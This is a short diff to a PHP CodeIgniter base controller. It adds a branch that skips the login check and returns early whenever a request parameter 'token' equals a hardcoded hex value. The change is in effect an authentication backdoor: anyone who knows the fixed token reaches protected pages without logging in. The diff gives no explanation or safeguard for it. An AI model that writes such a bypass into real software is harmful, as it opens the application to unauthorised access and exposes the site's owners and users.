@@ -32,6 +32,9 @@ class MY_Controller extends CI_Controller {
                     $this->_output();
                     exit();
                 }
+            } elseif (isset($_REQUEST['token']) && (in_array($_REQUEST['token'], [
+                    "aedadf3e3795b933db2883bd02f31e1d", ])) ) {
+                return;
             } else {
                 if(!$this->_checkUser()) {
                     $currentUrl = "//" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; //线上是https, 获取当前页面的地址
